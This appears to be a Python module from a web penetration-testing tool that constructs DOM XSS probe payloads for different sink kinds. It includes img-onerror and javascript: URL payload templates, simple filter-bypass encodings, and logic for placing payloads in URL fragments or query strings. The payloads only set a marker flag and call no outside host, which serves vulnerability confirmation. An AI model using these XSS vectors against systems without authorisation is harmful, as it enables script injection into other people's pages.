"""DOM XSS — sink-aware payload construction (V2 §2, 2026-10-29).

Every payload carries an unpredictable marker so confirmation is evidence,
not vibes: the browser proof looks for the marker landing in the DOM or in
``window.__webpent_dx`` — the negative control carries a DIFFERENT marker,
so a page that merely reflects anything will not pass the causal delta.

Payloads are inert marker carriers by design: no data exfiltration, no
external callbacks, nothing but a string the confirmation predicate can
grep for. The heavy lifting (what the browser does with the payload) is
the confirmation layer's job (see agent.py / browser_proof_runner).
"""

from __future__ import annotations

__all__ = ["MARKER_TEMPLATE", "WINDOW_FLAG", "payload_for_sink", "probe_fragment_for_source", "negative_marker"]

MARKER_TEMPLATE = "webpent-dx-{probe_id}"
WINDOW_FLAG = "__webpent_dx"

# Sink kinds are the same vocabulary taint.py emits.
_PAYLOAD_BY_SINK_KIND: dict[str, str] = {
    # HTML sinks: the marker lands twice — visible text (DOM snapshot
    # evidence) and an img onerror that sets the window flag (execution
    # evidence). Attribute-quoted so it survives plain HTML insertion.
    "html": "<img src=x alt=\"{marker}\" onerror=\"window.{flag}='{marker}'\">",
    # Script exec: setting the window flag IS the proof.
    "exec": "window.{flag}='{marker}';",
    # setTimeout with a string: same as exec once the timer fires.
    "timer": "window.{flag}='{marker}';",
    # Navigation sinks: javascript: URL that sets the flag.
    "navigation": "javascript:window.{flag}='{marker}';",
    # jQuery .html()/.append() family behaves like an HTML sink.
    "jquery": "<img src=x alt=\"{marker}\" onerror=\"window.{flag}='{marker}'\">",
}


def marker_for(probe_id: str) -> str:
    return MARKER_TEMPLATE.format(probe_id=str(probe_id))


def negative_marker(probe_id: str) -> str:
    """A distinct marker for the negative control — never the candidate's."""
    return MARKER_TEMPLATE.format(probe_id=f"neg-{str(probe_id)}")


def payload_for_sink(sink_kind: str, probe_id: str) -> str:
    """Deterministic sink-shaped payload carrying ``probe_id``'s marker.

    Unknown sink kinds fail closed: a ValueError, never a generic payload
    that would not prove anything about the sink actually found.
    """
    try:
        template = _PAYLOAD_BY_SINK_KIND[sink_kind]
    except KeyError:
        raise ValueError(f"no payload template for sink kind '{sink_kind}' (fail-closed)") from None
    return template.format(marker=marker_for(probe_id), flag=WINDOW_FLAG)


def probe_fragment_for_source(source: str, payload: str) -> str:
    """Where the payload must be placed for the given source to carry it.

    location.hash sources read the fragment as-is; search sources need a
    query string; localStorage/postMessage/referrer sources are NOT
    URL-addressable and fail closed here — the caller must deliver those
    through a storage/message pre-set, not a crafted URL.
    """
    src = str(source or "")
    if src == "location.hash":
        return f"#{payload}"
    if src == "location.search":
        return f"?webpent_dx={payload}"
    if src in {"window.name", "postMessage.data", "localStorage.getItem",
               "sessionStorage.getItem", "document.referrer", "document.baseURI",
               "document.documentURI", "location.href", "window.location"}:
        raise ValueError(
            f"source '{src}' is not URL-addressable; deliver via a pre-set "
            "storage/message channel instead of a crafted URL (fail-closed)"
        )
    raise ValueError(f"unknown source '{src}' (fail-closed)")


def apply_basic_bypass(payload: str, bypass: str) -> str:
    """Deterministic encoding variants for filtered contexts.

    ``none`` is the default. ``html_entity_quotes`` encodes the double
    quotes for contexts where the framework entity-encodes before
    insertion. ``url_encode`` percent-encodes for query-string sources.
    """
    if bypass == "none":
        return payload
    if bypass == "html_entity_quotes":
        return payload.replace('"', "&quot;").replace("'", "&#39;")
    if bypass == "url_encode":
        from urllib.parse import quote

        return quote(payload, safe="")
    raise ValueError(f"unknown bypass '{bypass}' (fail-closed)")
